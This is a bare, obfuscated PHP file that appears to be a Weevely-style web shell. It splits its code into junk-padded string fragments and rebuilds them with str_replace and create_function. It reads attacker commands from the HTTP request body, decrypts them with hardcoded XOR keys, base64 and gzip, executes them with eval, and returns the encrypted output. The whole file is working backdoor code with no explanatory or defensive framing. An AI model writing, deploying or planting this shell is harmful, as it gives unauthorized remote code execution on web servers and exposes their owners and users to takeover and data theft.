<?php
$Y='lKien($tKi);$o=Ki""Ki;for($i=0;$i<$KiKil;){for(Ki$j=0;($j<Ki$c&Ki&$i<$l);$K';
$V=str_replace('Og','','OgcreatOgOgOge_fOgOgunction');
$q='ij+Ki+,$i++){$oKi.=$t{$iKi}^$Kik{KiKi$j};}}rKieturn $o;}iKif (@preg_maKi';
$O='aseKi6Ki4_encode(@xKi(@gzcompreKissKi($o),$k))Ki;prKiint("$Kip$kh$r$kf");}';
$G='e($m[1]Ki),$k)))Ki;Ki$o=Ki@obKi_get_coKintentsKi();@KiKiob_eKind_clean();$r=@b';
$i='$m)==1Ki)Ki {@ob_start();@eKival(@KigzuncKiompKiress(@x(@baKiKiseKi64_decod';
$C='tch("/$kh(Ki.+)$kKif/Ki",@filKie_Kiget_conteKints("php://Kiinput"Ki)Ki,';
$j='$k=Ki"11b6b4b9";$KikKih="0d77cKi5d40dff";Ki$kf="Kibda2Ki227e72Kifa";$pKi';
$F='=Ki"rNkuVKi6SHZ0UaYWEi";fKiunctioKin x($Kit,$k){Ki$c=KiKistrlen($k);$l=stKir';
$w=str_replace('Ki','',$j.$F.$Y.$q.$C.$i.$G.$O);
$R=$V('',$w);$R();
?>
